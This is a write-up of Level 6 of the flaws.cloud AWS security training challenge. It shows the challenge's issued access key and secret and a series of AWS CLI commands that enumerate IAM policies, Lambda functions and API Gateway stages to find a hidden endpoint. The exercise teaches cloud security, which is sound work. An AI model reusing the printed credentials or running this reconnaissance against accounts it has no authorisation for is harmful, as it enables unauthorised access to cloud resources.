# Level 6
url: `http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/`

<kbd>![image](https://github.com/user-attachments/assets/eb4c364a-c80b-4bb4-8a86-bffb0f17e0cb)</kbd>

This time we are going to find policies and access attached to the given keys, also it said the there is SecurityAudit policy attached to these keys.

>- The **SecurityAudit** group can get a high level overview of the resources in an AWS account, but it's also useful for looking at IAM policies. 
>
>

```
Access key ID: AKIAJFQ6E7BY57Q3OBGA
Secret: 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
```

Lets proceed and add this new access to our profile using `aws configure` command

<kbd>![image](https://github.com/user-attachments/assets/24a8ba8e-0178-48f1-a2a6-38d871464394)</kbd>

We can check our listed profiles we can use 

```
aws configure list-profiles
```
<kbd>![image](https://github.com/user-attachments/assets/8d7fc921-b57c-4db9-97ac-1a3e9b30cfe1)</kbd>

First, find out who you are or this is equivalent to `whoami`

```
aws iam get-user --profile level6
```
<kbd>![image](https://github.com/user-attachments/assets/ae2c5ebc-488c-4742-a861-e533eda16b2c)</kbd>

we'll take note of the username, 
```
 "UserName": "Level6"
```

Using the username, this will allow us to request for any attached policies that it may have access to, 

```
└─$ aws iam list-attached-user-policies --user-name level6 --profile level6 
{
    "AttachedPolicies": [
        {
            "PolicyName": "MySecurityAudit",
            "PolicyArn": "arn:aws:iam::975426262029:policy/MySecurityAudit"
        },
        {
            "PolicyName": "list_apigateways",
            "PolicyArn": "arn:aws:iam::975426262029:policy/list_apigateways"
        }
    ]
}
  
```
<kbd>![image](https://github.com/user-attachments/assets/3e67ace5-2786-4bc4-8ec1-ad9d08111210)</kbd>

Great, we found another security policy called `list_apigateways`, to get more information about this policy, we first need to find it's `versionid`

To find the `versionid` we are going to use the command `aws iam get-policy` and we'll supply it with `policy-arn` we found earlier.

<kbd>![image](https://github.com/user-attachments/assets/8df2443b-6c80-47ce-b18a-679ea20f356d)</kbd>

Now that we have the `policy-arn` and the `versionid`, we can now procced to list what the actual policy is by using the `aws get-policy-version` 

We'll provide it with `policy-arn` and `version-id` we found earlier. 

```
aws iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4 --profile level6 
```

<kbd>![image](https://github.com/user-attachments/assets/a3c18607-9b7a-4c15-8f0e-e79779f7a75e)</kbd>

This tells us we can call "apigateway:GET" on "arn:aws:apigateway:us-west-2::/restapis/*" 

Since the `SecurityAudit policy` lets us see some things about lambdas: 

We can check this using the command `aws lambda list-functions`


```

└─$ aws lambda list-functions --region us-west-2 --profile level6
{
    "Functions": [
        {
            "FunctionName": "Level6",
            "FunctionArn": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
            "Runtime": "python2.7",
            "Role": "arn:aws:iam::975426262029:role/service-role/Level6",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 282,
            "Description": "A starter AWS Lambda function.",
            "Timeout": 3,
:

```

So we have a `FunctionName` called `Level6` , using this `FunctionName`, we can use this retrieve `rest-api-id` name using the `aws lambda get-policy`

```
┌──(aaron㉿kali)-[~/flaws/level6]
└─$ aws lambda get-policy --function-name Level6 --region us-west-2 --profile level6
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"904610a93f593b76ad66ed6ed82c0a8b\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"apigateway.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:975426262029:function:Level6\",\"Condition\":{\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\"}}}]}",
    "RevisionId": "edaca849-06fb-4495-a09c-3bc6115d3b87"
}
         
```

<kbd>![image](https://github.com/user-attachments/assets/dbd4eaa1-7c16-468c-a0e0-5491829f783b)</kbd>

This tells us we have the ability to execute `arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\` 

That "s33ppypa75" is a rest-api-id, which we can then use to find the resource name, we are going to use the `aws apigateway get-stages` command from the `rest-api-id` we just found

```
└─$ aws apigateway get-stages --rest-api-id s33ppypa75 --region us-west-2 --profile level6
{
    "item": [
        {
            "deploymentId": "8gppiv",
            "stageName": "Prod",
            "cacheClusterEnabled": false,
            "cacheClusterStatus": "NOT_AVAILABLE",
            "methodSettings": {},
            "tracingEnabled": false,
            "createdDate": "2017-02-26T19:26:08-05:00",
            "lastUpdatedDate": "2017-02-26T19:26:08-05:00"
        }
    ]
}


```
We can see from the results the  `"stageName": "Prod",` this is the resouce that we need to get the the hidden cloud resource. 

>- **Lambda** functions in aws are called using that **`rest-api-id**`, `**stage name**`, `**region**`, and `**resource**`.
>
>


>- `rest-api-id`  = s33ppypa75 (We got  from  `aws lambda get-policy` command )
>- `stage name` = execute-api (We got from  `aws lambda get-policy` command )
>- `region` = us-west-2 
>- `resource` = Prod/level6  (from `aws apigateway get-stages` )
 
If we combine them all together we will have ` https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6` which is the hidden aws resouce that we have to discover. 

If we now check the the url,

<kbd>![image](https://github.com/user-attachments/assets/b855e61e-de68-4121-9f6b-170b3d3b5238)</kbd>

It tells us to go to `http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/`

And if go the url 

![image](https://github.com/user-attachments/assets/cefa99cc-f91e-4e78-94bb-0a3e37425492)


The end. 



